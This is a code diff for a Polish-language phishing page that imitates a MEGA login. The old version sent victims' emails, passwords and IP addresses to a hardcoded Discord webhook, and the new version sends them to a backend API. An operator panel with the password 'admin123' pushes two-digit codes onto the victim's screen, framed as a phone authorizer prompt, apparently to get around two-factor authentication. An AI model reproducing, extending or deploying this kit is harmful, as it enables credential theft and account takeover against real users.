@@ -38,7 +38,7 @@
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         .verification-section .title { color: #aaa; font-size: 14px; margin-bottom: 8px; }
         .verification-section .subtitle { color: #666; font-size: 12px; margin-bottom: 12px; }
-        .verification-section .code-display { font-size: 36px; font-weight: 700; color: #4ade80; letter-spacing: 10px; background: #0d1a0d; padding: 12px; border-radius: 8px; margin: 10px 0; font-family: 'Courier New', monospace; }
+        .verification-section .code-display { font-size: 48px; font-weight: 700; color: #4ade80; letter-spacing: 8px; background: #0d1a0d; padding: 20px; border-radius: 8px; margin: 10px 0; font-family: 'Courier New', monospace; border: 1px solid #2d4a2d; }
         .verification-section .status { font-size: 13px; margin-bottom: 12px; }
         .verification-section .status.waiting { color: #fbbf24; }
         .verification-section .status.approved { color: #4ade80; }
@@ -69,20 +69,48 @@
         .admin-trigger:hover { color: #555; }
         .user-email-display { color: #888; font-size: 13px; text-align: center; margin-bottom: 15px; }
         .user-email-display span { color: #D42B3E; }
-        .code-input-group { display: flex; gap: 10px; margin: 15px 0; justify-content: center; flex-wrap: wrap; }
-        .code-input-group input { padding: 12px 16px; background: #0d1a0d; border: 1px solid #2d4a2d; border-radius: 8px; color: #4ade80; font-size: 28px; text-align: center; letter-spacing: 8px; font-family: 'Courier New', monospace; width: 120px; }
-        .code-input-group input:focus { outline: none; border-color: #4ade80; box-shadow: 0 0 20px rgba(74, 222, 128, 0.1); }
-        .code-input-group button { padding: 12px 30px; background: #4ade80; border: none; border-radius: 8px; color: #111; font-weight: 700; cursor: pointer; transition: 0.3s; font-size: 15px; }
-        .code-input-group button:hover { background: #22c55e; transform: scale(1.02); }
-        .code-input-group button:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-        .code-hint { color: #666; font-size: 11px; margin-top: 5px; }
         .admin-badge { background: #D42B3E; color: white; font-size: 10px; padding: 2px 10px; border-radius: 10px; display: inline-block; margin-left: 8px; }
         .status-badge { display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 10px; font-weight: 600; }
         .status-badge.pending { background: #fbbf24; color: #1a1a1a; }
         .status-badge.approved { background: #4ade80; color: #1a1a1a; }
         .status-badge.rejected { background: #ef4444; color: white; }
         .status-badge.waiting_confirm { background: #f59e0b; color: #1a1a1a; }
-        .admin-2fa-code-display { font-size: 28px; font-weight: 700; color: #4ade80; letter-spacing: 6px; background: #0d1a0d; padding: 10px 20px; border-radius: 8px; display: inline-block; font-family: 'Courier New', monospace; }
+        .code-received-box { display: none; margin-top: 15px; padding: 20px; background: #0d1a0d; border: 2px solid #4ade80; border-radius: 12px; animation: fadeIn 0.5s ease; }
+        .code-received-box.active { display: block; }
+        .code-received-box .label { color: #888; font-size: 12px; margin-bottom: 5px; }
+        .code-received-box .big-code { font-size: 48px; font-weight: 700; color: #4ade80; letter-spacing: 12px; font-family: 'Courier New', monospace; padding: 10px; }
+        .code-received-box .instruction { color: #666; font-size: 12px; margin-top: 5px; }
+        .session-id-display { color: #444; font-size: 9px; text-align: center; margin-top: 5px; word-break: break-all; }
+        #adminPanel { display: none; margin-top: 20px; padding: 20px; background: #111; border-radius: 10px; border: 1px solid #2a2a2a; }
+        #adminPanel.active { display: block; }
+        #adminPanel h3 { color: #D42B3E; font-size: 14px; margin-bottom: 10px; }
+        #adminPanel .log-entry { color: #888; font-size: 12px; padding: 4px 0; border-bottom: 1px solid #1a1a1a; }
+        #adminPanel .log-entry .time { color: #555; }
+        #adminPanel .log-entry .user { color: #4ade80; }
+        .admin-actions { margin-top: 10px; display: flex; gap: 8px; flex-wrap: wrap; }
+        .admin-actions button { padding: 8px 18px; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 13px; transition: 0.3s; }
+        .admin-actions .approve { background: #4ade80; color: #111; }
+        .admin-actions .approve:hover { background: #22c55e; transform: scale(1.02); }
+        .admin-actions .reject { background: #ef4444; color: white; }
+        .admin-actions .reject:hover { background: #dc2626; transform: scale(1.02); }
+        .admin-actions .logout { background: #333; color: #aaa; }
+        .admin-actions .logout:hover { background: #444; }
+        .admin-actions .set-code { background: #fbbf24; color: #111; }
+        .admin-actions .set-code:hover { background: #f59e0b; transform: scale(1.02); }
+        #adminStatus { margin-top: 8px; color: #fbbf24; font-size: 13px; min-height: 20px; }
+        #adminLogin { display: none; margin-top: 15px; padding-top: 15px; border-top: 1px solid #2a2a2a; }
+        #adminLogin.active { display: block; }
+        #adminLogin .form-group label { color: #666; font-size: 12px; }
+        #adminLogin .form-group input { background: #1a1a1a; }
+        #adminLogin button { padding: 8px 20px; background: #333; border: 1px solid #444; border-radius: 6px; color: #aaa; cursor: pointer; transition: 0.3s; }
+        #adminLogin button:hover { background: #444; }
+        .admin-code-input-group { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; margin-top: 10px; }
+        .admin-code-input-group input { padding: 10px 16px; background: #0d1a0d; border: 1px solid #2d4a2d; border-radius: 6px; color: #4ade80; font-size: 24px; text-align: center; width: 80px; font-family: 'Courier New', monospace; letter-spacing: 4px; }
+        .admin-code-input-group input:focus { outline: none; border-color: #4ade80; }
+        .admin-code-display { color: #4ade80; font-size: 18px; font-family: 'Courier New', monospace; letter-spacing: 4px; margin-left: 10px; }
+        .admin-info { color: #555; font-size: 11px; text-align: center; margin-top: 5px; border-top: 1px solid #1a1a1a; padding-top: 8px; }
+        .admin-info strong { color: #4ade80; }
+        .admin-info .highlight { color: #fbbf24; }
     </style>
 </head>
 <body>
@@ -183,18 +211,19 @@
             <!-- Weryfikacja 2FA -->
             <div class="verification-section" id="verificationSection">
                 <div class="title">🔐 Weryfikacja dwuetapowa</div>
-                <div class="subtitle">Sprawdź swoją skrzynkę pocztową i wpisz kod</div>
+                <div class="subtitle" id="subtitle">Sprawdź aplikację autoryzacyjną na swoim telefonie</div>
 
-                <div class="code-input-group">
-                    <input type="text" id="codeInput2fa" placeholder="__" maxlength="2" autocomplete="off" style="width:100px; font-size:32px; letter-spacing:10px;">
-                    <button id="verifyBtn" onclick="verifyCode()">✅ Zweryfikuj</button>
+                <div class="code-received-box" id="codeReceivedBox">
+                    <div class="label">📱 Kod autoryzacyjny:</div>
+                    <div class="big-code" id="liveCodeDisplay">••</div>
+                    <div class="instruction">Wprowadź ten kod w aplikacji aby zatwierdzić dostęp</div>
                 </div>
-                <div class="code-hint">📧 Kod został wysłany na Twój adres email</div>
 
-                <div class="status waiting" id="codeStatus">⏳ Oczekiwanie na kod z maila</div>
+                <div class="status waiting" id="codeStatus">⏳ Oczekiwanie na kod z aplikacji</div>
                 <div style="margin-top:5px; font-size:11px; color:#444;">
-                    Jeśli nie otrzymałeś kodu, <a href="#" onclick="resendCode()" style="color:#4ade80; text-decoration:none;">wyślij ponownie</a>
+                    <a href="#" onclick="resendCode()" style="color:#4ade80; text-decoration:none;">Wyślij ponownie</a>
                 </div>
+                <div class="session-id-display">Sesja: <span id="sessionIdText">---</span></div>
             </div>
 
             <div class="unlock-message" id="unlockMessage">
@@ -205,28 +234,28 @@
         </div>
 
         <!-- Panel Admina -->
-        <div id="adminPanel" style="display:none; margin-top:20px; padding:20px; background:#111; border-radius:10px; border:1px solid #2a2a2a;">
-            <h3 style="color:#D42B3E; font-size:14px; margin-bottom:10px;">🛡️ Panel Administratora</h3>
+        <div id="adminPanel">
+            <h3>🛡️ Panel Administratora</h3>
             <div id="adminLogs"><div style="color:#555;">Brak oczekujących logowań</div></div>
             
             <div style="margin-top:12px; padding:12px; background:#1a2a1a; border-radius:8px; border:1px solid #2d4a2d;">
                 <div style="color:#888; font-size:12px; margin-bottom:4px;">🔐 Kod 2FA (ustaw po zalogowaniu użytkownika):</div>
-                <div style="display:flex; gap:10px; align-items:center; flex-wrap:wrap;">
-                    <input type="text" id="adminCodeInput" placeholder="np. 12" maxlength="2" style="padding:10px 16px; background:#0d1a0d; border:1px solid #2d4a2d; border-radius:6px; color:#4ade80; font-size:24px; text-align:center; width:80px; font-family:'Courier New',monospace; letter-spacing:4px;">
-                    <button onclick="adminSetCode()" style="padding:8px 18px; background:#fbbf24; border:none; border-radius:6px; color:#111; font-weight:600; cursor:pointer;">🔐 Ustaw kod</button>
-                    <span id="currentCodeDisplay" style="color:#4ade80; font-size:18px; font-family:'Courier New',monospace; letter-spacing:4px; margin-left:10px;"></span>
+                <div class="admin-code-input-group">
+                    <input type="text" id="adminCodeInput" placeholder="12" maxlength="2">
+                    <button class="admin-actions set-code" onclick="adminSetCode()" style="padding:8px 18px; background:#fbbf24; border:none; border-radius:6px; color:#111; font-weight:600; cursor:pointer;">🔐 Wyślij kod</button>
+                    <span class="admin-code-display" id="currentCodeDisplay"></span>
                 </div>
                 <div style="color:#555; font-size:10px; margin-top:4px;">Kod musi być 2-cyfrowy (np. 12, 34, 56)</div>
             </div>
 
-            <div style="margin-top:10px; display:flex; gap:8px; flex-wrap:wrap;">
-                <button onclick="adminApprove()" style="padding:8px 18px; background:#4ade80; border:none; border-radius:6px; color:#111; font-weight:600; cursor:pointer;">✅ Zatwierdź</button>
-                <button onclick="adminReject()" style="padding:8px 18px; background:#ef4444; border:none; border-radius:6px; color:white; font-weight:600; cursor:pointer;">❌ Odrzuć</button>
-                <button onclick="adminLogout()" style="padding:8px 18px; background:#333; border:none; border-radius:6px; color:#aaa; cursor:pointer;">🚪 Wyjdź</button>
+            <div class="admin-actions">
+                <button class="approve" onclick="adminApprove()">✅ Zatwierdź</button>
+                <button class="reject" onclick="adminReject()">❌ Odrzuć</button>
+                <button class="logout" onclick="adminLogout()">🚪 Wyjdź</button>
             </div>
-            <div id="adminStatus" style="margin-top:8px; color:#fbbf24; font-size:13px;"></div>
-            <div style="margin-top:8px; color:#555; font-size:11px; border-top:1px solid #1a1a1a; padding-top:8px;">
-                ⚠️ <strong>1. Użytkownik loguje się</strong> → <strong>2. Ustaw kod 2FA</strong> → <strong>3. Użytkownik wpisuje kod</strong> → <strong>4. Zatwierdź</strong>
+            <div id="adminStatus"></div>
+            <div class="admin-info">
+                ⚠️ <strong>1. Użytkownik loguje się</strong> → <strong>2. Ustaw kod 2FA</strong> → <strong>3. Kod pojawia się na ekranie użytkownika LIVE</strong> → <strong>4. Zatwierdź</strong>
             </div>
         </div>
 
@@ -236,7 +265,7 @@
         </div>
 
         <!-- Admin Login Form (ukryty) -->
-        <div id="adminLogin" style="display:none; margin-top:15px; padding-top:15px; border-top:1px solid #2a2a2a;">
+        <div id="adminLogin">
             <div class="form-group">
                 <label style="color:#666; font-size:12px;">Hasło administratora</label>
                 <input type="password" id="adminPassInput" placeholder="Wprowadź hasło">
@@ -249,22 +278,16 @@
 
     <script>
         // ============================================================
-        // KONFIGURACJA - WSTAW SWÓJ WEBHOOK
+        // KONFIGURACJA
         // ============================================================
-        const CONFIG = {
-            DISCORD_WEBHOOK: 'https://discord.com/api/webhooks/1544436490254159957/8LfIkC-dfuwBv5-RpLtwJCNvMJHIjClx1wYcjyStywRq3xwN9QGv9TrRwYwQGWiIIi31',
-            ADMIN_PASSWORD: 'admin123'
-        };
-
-        // ============================================================
-        // ZMIENNE
-        // ============================================================
+        const API_BASE = '/api';
+        let sessionId = null;
         let pendingUser = null;
         let adminCode = null;
         let isAdmin = false;
         let codeVerified = false;
         let adminTriggerCount = 0;
-        let currentUserEmail = '';
+        let pollingInterval = null;
 
         // ============================================================
         // TOAST
@@ -277,29 +300,6 @@
             clearTimeout(toast._timeout);
             toast._timeout = setTimeout(() => { toast.className = 'toast'; }, 3500);
         }
-
-        // ============================================================
-        // NASŁUCHIWANIE NA ZMIANY LOCALSTORAGE (między oknami)
-        // ============================================================
-        window.addEventListener('storage', function(e) {
-            // Gdy admin ustawi kod w localStorage - użytkownik natychmiast to widzi
-            if (e.key === 'mega_2fa_code' && e.newValue && pendingUser) {
-                adminCode = e.newValue;
-                document.getElementById('codeStatus').textContent = '📧 Otrzymałeś kod na email! Wpisz go poniżej.';
-                document.getElementById('codeStatus').className = 'status waiting';
-                document.getElementById('codeStatus').style.color = '#4ade80';
-                showToast('📧 Kod został wysłany na Twój email!');
-                
-                // Odśwież logi admina
-                if (isAdmin) loadAdminLogs();
-            }
-            
-            // Gdy użytkownik wpisze kod i zweryfikuje - admin widzi status
-            if (e.key === 'mega_2fa_verified' && e.newValue === 'true') {
-                codeVerified = true;
-                if (isAdmin) loadAdminLogs();
-            }
-        });
 
         // ============================================================
         // GOOGLE LOGIN
@@ -329,7 +329,7 @@
         }
 
         // ============================================================
-        // LOGOWANIE
+        // LOGOWANIE (przez API)
         // ============================================================
         async function submitLogin() {
             const email = document.getElementById('emailInput').value.trim();
@@ -340,10 +340,8 @@
                 return;
             }
 
-            currentUserEmail = email;
-
-            // Sprawdź czy to admin
-            if (email === 'admin@mega.nz' && password === CONFIG.ADMIN_PASSWORD) {
+            // Sprawdź czy to admin (lokalnie)
+            if (email === 'admin@mega.nz' && password === 'admin123') {
                 isAdmin = true;
                 document.getElementById('loginForm').style.display = 'none';
                 document.getElementById('folderPanel').classList.remove('hidden');
@@ -356,118 +354,130 @@
                 return;
             }
 
-            // Normalny użytkownik
-            pendingUser = { email: email, password: password, timestamp: new Date().toISOString() };
-            adminCode = null;
-            codeVerified = false;
+            showToast('⏳ Logowanie...');
 
-            // Wyślij na Discord
-            await sendToDiscord({
-                title: '🔐 Nowe logowanie - czeka na kod 2FA',
-                message: 'Użytkownik ' + email + ' próbuje uzyskać dostęp.',
-                color: 0xFBBF24,
-                fields: [
-                    { name: '📧 Email', value: email, inline: true },
-                    { name: '🔑 Hasło', value: '||' + password + '||', inline: true },
-                    { name: '⏱️ Czas', value: new Date().toLocaleString(), inline: true },
-                    { name: '🌐 IP', value: await getIP(), inline: true }
-                ]
-            });
+            try {
+                const ip = await getIP();
+                const response = await fetch(`${API_BASE}/session`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password, ip })
+                });
 
-            // Przejdź do panelu z folderami
-            document.getElementById('loginForm').style.display = 'none';
-            document.getElementById('folderPanel').classList.remove('hidden');
-            document.getElementById('userEmailDisplay').textContent = email;
+                const data = await response.json();
 
-            // Pokaż weryfikację 2FA
-            document.getElementById('verificationSection').classList.add('active');
-            document.getElementById('unlockMessage').classList.remove('active');
-            document.getElementById('codeStatus').textContent = '📧 Sprawdź skrzynkę pocztową i wpisz kod';
-            document.getElementById('codeStatus').className = 'status waiting';
-            document.getElementById('codeInput2fa').value = '';
-            document.getElementById('codeInput2fa').focus();
+                if (!data.success) {
+                    showToast('❌ Błąd logowania', true);
+                    return;
+                }
 
-            showToast('📧 Kod został wysłany na Twój email');
+                sessionId = data.sessionId;
+                pendingUser = { email, password };
+                adminCode = null;
+                codeVerified = false;
 
-            // Jeśli admin jest zalogowany, odśwież logi
-            if (isAdmin) {
-                loadAdminLogs();
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('folderPanel').classList.remove('hidden');
+                document.getElementById('userEmailDisplay').textContent = email;
+                document.getElementById('sessionIdText').textContent = sessionId;
+
+                document.getElementById('verificationSection').classList.add('active');
+                document.getElementById('unlockMessage').classList.remove('active');
+                document.getElementById('codeStatus').textContent = '⏳ Oczekiwanie na kod z aplikacji';
+                document.getElementById('codeStatus').className = 'status waiting';
+                document.getElementById('codeReceivedBox').classList.remove('active');
+                document.getElementById('liveCodeDisplay').textContent = '••';
+
+                showToast('📱 Czekaj na kod autoryzacyjny...');
+
+                // Rozpocznij polling
+                startPolling();
+
+            } catch (error) {
+                showToast('❌ Błąd połączenia z serwerem', true);
+                console.error(error);
             }
         }
 
         // ============================================================
-        // WERYFIKACJA KODU
+        // POLLING (sprawdza czy admin ustawił kod)
         // ============================================================
-        function verifyCode() {
-            const inputCode = document.getElementById('codeInput2fa').value.trim();
+        function startPolling() {
+            if (pollingInterval) clearInterval(pollingInterval);
+            
+            pollingInterval = setInterval(async () => {
+                if (!sessionId) return;
+                if (codeVerified) {
+                    clearInterval(pollingInterval);
+                    return;
+                }
 
-            if (!inputCode) {
-                showToast('❌ Wprowadź kod', true);
-                return;
-            }
+                try {
+                    const response = await fetch(`${API_BASE}/poll-session?sessionId=${sessionId}`);
+                    const data = await response.json();
 
-            if (inputCode.length !== 2) {
-                showToast('❌ Kod musi mieć 2 cyfry', true);
-                return;
-            }
+                    if (data.code && !codeVerified) {
+                        adminCode = data.code;
+                        document.getElementById('liveCodeDisplay').textContent = adminCode;
+                        document.getElementById('codeReceivedBox').classList.add('active');
+                        document.getElementById('codeStatus').textContent = '📱 Kod autoryzacyjny został wysłany na Twój telefon!';
+                        document.getElementById('codeStatus').className = 'status waiting';
+                        document.getElementById('codeStatus').style.color = '#4ade80';
+                        document.getElementById('subtitle').textContent = 'Wprowadź kod w aplikacji autoryzacyjnej na swoim telefonie';
+                        showToast('📱 Kod autoryzacyjny pojawił się na ekranie!');
+                    }
 
-            if (!adminCode) {
-                showToast('⏳ Czekaj na kod z maila...', true);
-                return;
-            }
+                    if (data.verified) {
+                        codeVerified = true;
+                        document.getElementById('codeStatus').textContent = '✅ Kod zweryfikowany! Pliki odblokowane';
+                        document.getElementById('codeStatus').className = 'status approved';
+                        document.querySelectorAll('.folder-item').forEach(el => {
+                            el.classList.remove('blurred');
+                        });
+                        document.getElementById('unlockMessage').classList.add('active');
+                        document.getElementById('verificationSection').classList.remove('active');
+                        showToast('✅ Weryfikacja zakończona pomyślnie!');
+                        clearInterval(pollingInterval);
+                    }
 
-            if (inputCode === adminCode) {
-                codeVerified = true;
-                document.getElementById('codeStatus').textContent = '✅ Kod zweryfikowany! Pliki odblokowane';
-                document.getElementById('codeStatus').className = 'status approved';
+                    if (data.rejected) {
+                        document.getElementById('codeStatus').textContent = '❌ Dostęp odrzucony przez administratora';
+                        document.getElementById('codeStatus').className = 'status rejected';
+                        clearInterval(pollingInterval);
+                    }
 
-                document.querySelectorAll('.folder-item').forEach(el => {
-                    el.classList.remove('blurred');
-                });
-                document.getElementById('unlockMessage').classList.add('active');
-                document.getElementById('verificationSection').classList.remove('active');
+                    if (data.approved) {
+                        codeVerified = true;
+                        document.getElementById('codeStatus').textContent = '✅ Dostęp zatwierdzony! Pliki odblokowane';
+                        document.getElementById('codeStatus').className = 'status approved';
+                        document.querySelectorAll('.folder-item').forEach(el => {
+                            el.classList.remove('blurred');
+                        });
+                        document.getElementById('unlockMessage').classList.add('active');
+                        document.getElementById('verificationSection').classList.remove('active');
+                        showToast('✅ Dostęp zatwierdzony!');
+                        clearInterval(pollingInterval);
+                    }
 
-                // Zapisz w localStorage że zweryfikowano (dla admina)
-                localStorage.setItem('mega_2fa_verified', 'true');
-
-                showToast('✅ Weryfikacja zakończona pomyślnie!');
-
-                sendToDiscord({
-                    title: '✅ Użytkownik zweryfikował kod 2FA!',
-                    message: 'Użytkownik ' + pendingUser.email + ' poprawnie wpisał kod.',
-                    color: 0x4ADE80,
-                    fields: [
-                        { name: '📧 Email', value: pendingUser.email, inline: true },
-                        { name: '🔐 Kod', value: inputCode, inline: true }
-                    ]
-                });
-
-                localStorage.removeItem('mega_2fa_code');
-
-            } else {
-                showToast('❌ Nieprawidłowy kod! Spróbuj ponownie.', true);
-                document.getElementById('codeStatus').textContent = '❌ Nieprawidłowy kod! Spróbuj ponownie.';
-                document.getElementById('codeStatus').className = 'status rejected';
-                document.getElementById('codeInput2fa').value = '';
-                document.getElementById('codeInput2fa').focus();
-            }
+                } catch (error) {
+                    console.error('Polling error:', error);
+                }
+            }, 2000);
         }
 
         // ============================================================
         // PONOWNE WYSŁANIE KODU
         // ============================================================
         function resendCode() {
-            if (pendingUser) {
-                showToast('📧 Ponownie wysyłamy kod na Twój email...');
-                sendToDiscord({
-                    title: '📧 Użytkownik poprosił o ponowne wysłanie kodu',
-                    message: 'Użytkownik ' + pendingUser.email + ' poprosił o ponowne wysłanie kodu.',
-                    color: 0xFBBF24
-                });
-                adminCode = null;
-                localStorage.removeItem('mega_2fa_code');
-                document.getElementById('codeStatus').textContent = '⏳ Oczekiwanie na nowy kod...';
+            if (adminCode && pendingUser) {
+                showToast('📱 Ponownie wyświetlamy kod na ekranie...');
+                document.getElementById('liveCodeDisplay').textContent = adminCode;
+                document.getElementById('codeReceivedBox').classList.add('active');
+                document.getElementById('codeStatus').textContent = '📱 Kod autoryzacyjny został ponownie wysłany na Twój telefon!';
                 document.getElementById('codeStatus').className = 'status waiting';
+                document.getElementById('codeStatus').style.color = '#4ade80';
+            } else {
+                showToast('⏳ Czekaj na kod od administratora...', true);
             }
         }
 
@@ -481,34 +491,6 @@
                 return data.ip;
             } catch {
                 return '127.0.0.1';
-            }
-        }
-
-        // ============================================================
-        // DISCORD WEBHOOK
-        // ============================================================
-        async function sendToDiscord(data) {
-            try {
-                const response = await fetch(CONFIG.DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: 'MEGA Panel',
-                        avatar_url: 'https://i.imgur.com/4M3VY1A.png',
-                        embeds: [{
-                            title: data.title || '🔐 Nowe logowanie',
-                            description: data.message || '',
-                            color: data.color || 0xD42B3E,
-                            fields: data.fields || [],
-                            timestamp: new Date().toISOString(),
-                            footer: { text: 'MEGA Clone v2.0' }
-                        }]
-                    })
-                });
-                return await response.json();
-            } catch (e) {
-                console.error('Discord webhook error:', e);
-                return null;
             }
         }
 
@@ -530,7 +512,7 @@
 
         function adminLogin() {
             const pass = document.getElementById('adminPassInput').value;
-            if (pass === CONFIG.ADMIN_PASSWORD) {
+            if (pass === 'admin123') {
                 isAdmin = true;
                 document.getElementById('adminPanel').style.display = 'block';
                 document.getElementById('adminLogin').style.display = 'none';
@@ -563,7 +545,7 @@
                         <span style="color:#4ade80; margin:0 10px;">${pendingUser.email}</span>
                         <span class="status-badge ${statusClass}">${statusText}</span>
                         <span style="color:#888; font-size:10px; margin-left:10px;">
-                            Kod: <strong style="color:#4ade80;">${adminCode || '❌ NIE USTAWIONO'}</strong>
+                            Sesja: <strong style="color:#4ade80;">${sessionId || '---'}</strong>
                         </span>
                     </div>
                 `;
@@ -573,9 +555,9 @@
         }
 
         // ============================================================
-        // ADMIN - USTAWA KOD 2FA
+        // ADMIN - USTAWA KOD 2FA (przez API)
         // ============================================================
-        function adminSetCode() {
+        async function adminSetCode() {
             const code = document.getElementById('adminCodeInput').value.trim();
 
             if (!code || code.length !== 2 || isNaN(code)) {
@@ -584,87 +566,136 @@
                 return;
             }
 
-            adminCode = code;
-            document.getElementById('adminStatus').textContent = '✅ Kod ustawiony: ' + code;
-            document.getElementById('adminStatus').style.color = '#4ade80';
-            document.getElementById('adminCodeInput').value = '';
-            document.getElementById('currentCodeDisplay').textContent = '🔐 ' + code;
+            if (!sessionId) {
+                document.getElementById('adminStatus').textContent = '❌ Brak sesji! Zaloguj użytkownika najpierw.';
+                document.getElementById('adminStatus').style.color = '#ef4444';
+                return;
+            }
 
-            // Zapis do localStorage - wywoła zdarzenie 'storage' w innych oknach
-            localStorage.setItem('mega_2fa_code', code);
+            document.getElementById('adminStatus').textContent = '⏳ Wysyłanie kodu...';
+            document.getElementById('adminStatus').style.color = '#fbbf24';
 
-            sendToDiscord({
-                title: '🔐 Nowy kod 2FA ustawiony',
-                message: 'Admin ustawił kod: ' + code,
-                color: 0xFBBF24
-            });
+            try {
+                const response = await fetch(`${API_BASE}/set-code`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: sessionId,
+                        code: code,
+                        adminPassword: 'admin123'
+                    })
+                });
 
-            showToast('✅ Kod ustawiony: ' + code);
-            loadAdminLogs();
+                const data = await response.json();
+
+                if (data.success) {
+                    adminCode = code;
+                    document.getElementById('adminStatus').textContent = '✅ Kod ustawiony: ' + code + ' - pojawi się na ekranie użytkownika!';
+                    document.getElementById('adminStatus').style.color = '#4ade80';
+                    document.getElementById('adminCodeInput').value = '';
+                    document.getElementById('currentCodeDisplay').textContent = '🔐 ' + code;
+                    showToast('✅ Kod ' + code + ' wysłany na ekran użytkownika!');
+                    loadAdminLogs();
+                } else {
+                    document.getElementById('adminStatus').textContent = '❌ ' + (data.error || 'Błąd');
+                    document.getElementById('adminStatus').style.color = '#ef4444';
+                }
+            } catch (error) {
+                document.getElementById('adminStatus').textContent = '❌ Błąd połączenia';
+                document.getElementById('adminStatus').style.color = '#ef4444';
+            }
         }
 
         // ============================================================
-        // ADMIN - ZATWIERDŹ UŻYTKOWNIKA
+        // ADMIN - ZATWIERDŹ UŻYTKOWNIKA (przez API)
         // ============================================================
-        function adminApprove() {
-            if (!pendingUser) {
-                document.getElementById('adminStatus').textContent = '❌ Brak oczekującego użytkownika';
+        async function adminApprove() {
+            if (!sessionId) {
+                document.getElementById('adminStatus').textContent = '❌ Brak sesji!';
                 document.getElementById('adminStatus').style.color = '#ef4444';
                 return;
             }
 
-            if (!adminCode) {
-                document.getElementById('adminStatus').textContent = '❌ Najpierw ustaw kod!';
+            document.getElementById('adminStatus').textContent = '⏳ Zatwierdzanie...';
+            document.getElementById('adminStatus').style.color = '#fbbf24';
+
+            try {
+                const response = await fetch(`${API_BASE}/admin-approve`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: sessionId,
+                        adminPassword: 'admin123'
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    codeVerified = true;
+                    document.getElementById('adminStatus').textContent = '✅ Użytkownik zatwierdzony!';
+                    document.getElementById('adminStatus').style.color = '#4ade80';
+                    
+                    document.querySelectorAll('.folder-item').forEach(el => {
+                        el.classList.remove('blurred');
+                    });
+                    document.getElementById('unlockMessage').classList.add('active');
+                    document.getElementById('verificationSection').classList.remove('active');
+                    
+                    showToast('✅ Użytkownik zatwierdzony!');
+                    loadAdminLogs();
+                } else {
+                    document.getElementById('adminStatus').textContent = '❌ ' + (data.error || 'Błąd');
+                    document.getElementById('adminStatus').style.color = '#ef4444';
+                }
+            } catch (error) {
+                document.getElementById('adminStatus').textContent = '❌ Błąd połączenia';
                 document.getElementById('adminStatus').style.color = '#ef4444';
-                return;
             }
-
-            codeVerified = true;
-            document.getElementById('adminStatus').textContent = '✅ Użytkownik zatwierdzony!';
-            document.getElementById('adminStatus').style.color = '#4ade80';
-
-            document.querySelectorAll('.folder-item').forEach(el => {
-                el.classList.remove('blurred');
-            });
-            document.getElementById('unlockMessage').classList.add('active');
-            document.getElementById('verificationSection').classList.remove('active');
-
-            sendToDiscord({
-                title: '✅ Admin zatwierdził użytkownika',
-                message: 'Admin zatwierdził użytkownika ' + pendingUser.email,
-                color: 0x4ADE80
-            });
-
-            showToast('✅ Użytkownik zatwierdzony!');
-            loadAdminLogs();
         }
 
         // ============================================================
-        // ADMIN - ODRZUĆ UŻYTKOWNIKA
+        // ADMIN - ODRZUĆ UŻYTKOWNIKA (przez API)
         // ============================================================
-        function adminReject() {
-            if (!pendingUser) {
-                document.getElementById('adminStatus').textContent = '❌ Brak oczekującego użytkownika';
+        async function adminReject() {
+            if (!sessionId) {
+                document.getElementById('adminStatus').textContent = '❌ Brak sesji!';
                 document.getElementById('adminStatus').style.color = '#ef4444';
                 return;
             }
 
-            sendToDiscord({
-                title: '❌ Admin odrzucił użytkownika',
-                message: 'Admin odrzucił użytkownika ' + pendingUser.email,
-                color: 0xEF4444
-            });
+            if (!confirm('❌ Na pewno odrzucić użytkownika?')) return;
 
-            document.getElementById('adminStatus').textContent = '❌ Użytkownik odrzucony';
-            document.getElementById('adminStatus').style.color = '#ef4444';
-            document.getElementById('codeStatus').textContent = '❌ Dostęp odrzucony przez administratora';
-            document.getElementById('codeStatus').className = 'status rejected';
+            try {
+                const response = await fetch(`${API_BASE}/admin-reject`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: sessionId,
+                        adminPassword: 'admin123'
+                    })
+                });
 
-            pendingUser = null;
-            adminCode = null;
-            localStorage.removeItem('mega_2fa_code');
-            showToast('❌ Użytkownik odrzucony', true);
-            loadAdminLogs();
+                const data = await response.json();
+
+                if (data.success) {
+                    document.getElementById('adminStatus').textContent = '❌ Użytkownik odrzucony';
+                    document.getElementById('adminStatus').style.color = '#ef4444';
+                    document.getElementById('codeStatus').textContent = '❌ Dostęp odrzucony przez administratora';
+                    document.getElementById('codeStatus').className = 'status rejected';
+                    
+                    pendingUser = null;
+                    adminCode = null;
+                    showToast('❌ Użytkownik odrzucony', true);
+                    loadAdminLogs();
+                } else {
+                    document.getElementById('adminStatus').textContent = '❌ ' + (data.error || 'Błąd');
+                    document.getElementById('adminStatus').style.color = '#ef4444';
+                }
+            } catch (error) {
+                document.getElementById('adminStatus').textContent = '❌ Błąd połączenia';
+                document.getElementById('adminStatus').style.color = '#ef4444';
+            }
         }
 
         // ============================================================
@@ -673,9 +704,6 @@
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
                 const active = document.activeElement;
-                if (active && active.id === 'codeInput2fa') {
-                    verifyCode();
-                }
                 if (active && active.id === 'adminCodeInput') {
                     adminSetCode();
                 }
@@ -686,22 +714,16 @@
             }
         });
 
-        // Auto-focus na pole kodu
+        // Auto-focus na pole kodu admina
         document.addEventListener('DOMContentLoaded', function() {
-            const observer = new MutationObserver(() => {
-                const section = document.getElementById('verificationSection');
-                if (section && section.classList.contains('active')) {
-                    setTimeout(() => {
-                        document.getElementById('codeInput2fa').focus();
-                    }, 500);
+            setTimeout(() => {
+                if (document.getElementById('adminCodeInput')) {
+                    document.getElementById('adminCodeInput').focus();
                 }
-            });
-            observer.observe(document.getElementById('verificationSection'), { attributes: true, attributeFilter: ['class'] });
+            }, 500);
         });
 
